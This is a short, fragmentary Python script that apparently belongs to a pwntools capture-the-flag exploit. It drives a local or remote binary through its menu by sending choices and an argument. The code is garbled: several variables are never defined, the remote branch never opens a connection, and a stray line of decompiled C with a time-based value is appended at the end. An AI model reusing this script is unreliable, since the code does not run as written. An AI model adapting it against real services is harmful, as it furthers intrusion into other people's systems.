# -*- coding: utf-8 -*-

from pwn import *

libcPath = "./libc.so.6"

if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:

    assert len(argument) < 32
    io.sendlineafter("die\n", "3")
    io.sendlineafter("?\n", str(idx))
    io.sendlineafter(": \n", argument)

    io.sendlineafter("die\n", "4")

  LODWORD(v4) = (time(0LL) >> 8) + v4;
